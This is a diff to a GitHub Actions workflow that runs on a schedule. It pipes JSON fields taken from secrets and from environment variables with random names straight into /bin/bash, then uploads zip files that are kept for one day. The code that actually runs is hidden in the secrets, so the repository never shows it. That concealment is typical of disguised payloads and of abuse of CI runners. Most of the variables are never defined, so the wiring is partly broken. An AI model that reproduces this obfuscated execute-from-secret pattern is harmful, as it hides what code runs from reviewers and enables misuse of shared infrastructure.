@@ -1,27 +1,26 @@
 name: zhifeihaoyan
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '25 1/6 * * *'
 
-jobs:  # 9299
+  schedule:
+    - cron: '20 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhifeihaoyan
         env:
-          jr84282: ${{ secrets.jr84282 }}
+          ley3: ${{ secrets.ley3 }}
         run: |
-          echo $jr84282 | jq -r .tgry5 | /bin/bash
-          echo $j24 | jq -r .yz1 | /bin/bash
-          echo $ixjw159 | jq -r .nvsa91 | /bin/bash
-          echo $hnamk817 | jq -r .znk024 | /bin/bash
-          echo $nxj0 | jq -r .txnx00276 | /bin/bash
-          echo $wkflq5 | jq -r .qrc13 | /bin/bash
-          echo $elvkh40178 | jq -r .zzdj81451 | /bin/bash
-          echo $ag2 | jq -r .m26 | /bin/bash
-          echo $ps073 | jq -r .m540 | /bin/bash
-          echo $nwkn38 | jq -r .ykp723 | /bin/bash
+          printf '%s' "$ley3" | jq -r .urnw6470 | /bin/bash
+          echo $txwoq90010 | jq -r .sz09974 | /bin/bash
+          echo $eur734 | jq -r .cyxo067 | /bin/bash
+          echo $k7 | jq -r .t5491 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: pmk2W6nm
+          path: "*.zip"
+          retention-days: 1
